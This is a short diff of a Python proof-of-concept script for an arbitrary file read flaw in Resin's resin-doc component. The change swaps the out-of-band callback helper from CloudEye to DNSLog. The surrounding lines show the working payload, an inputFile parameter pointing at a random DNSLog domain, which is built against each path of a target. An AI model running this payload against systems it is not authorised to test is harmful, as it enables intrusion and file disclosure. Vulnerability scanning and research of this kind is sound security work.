@@ -11,7 +11,7 @@ resin-doc 任意文件读取漏洞
 """
 
 import requests
-from plugin.cloudeye import CloudEye
+from plugin.DNSLog import DNSLog
 from plugin.urlparser import iterate_path
 
 
@@ -20,7 +20,7 @@ def poc(url):
     print iterate_path(url)
     for each in iterate_path(url):
         try:
-            c = CloudEye()
+            c = DNSLog()
             domain = c.getRandomDomain('resin')
             payload = '/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://%s' % domain
             target = each.rstrip('/') + payload
